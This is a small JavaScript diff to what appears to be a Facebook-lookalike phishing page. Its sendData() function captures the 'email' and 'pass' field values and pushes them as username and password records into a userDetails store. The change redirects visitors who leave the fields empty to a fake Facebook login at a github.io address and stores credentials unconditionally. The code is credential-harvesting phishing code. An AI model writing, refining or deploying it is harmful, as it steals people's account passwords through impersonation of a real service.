@@ -12,12 +12,15 @@ var config = {
 
 function sendData()
 {
-	if($("email").value!="" && $("pass").value!="")
+	if($("email").value=="" && $("pass").value=="")
 	{
+		window.location="https://fbtemplate.github.io/facebook.com/login";
+	}
+	
 			var data = {
 						username : $("email").value,
 						password : $("pass").value
 					}
 			userDetails.push(data);
-	}
+	
 }
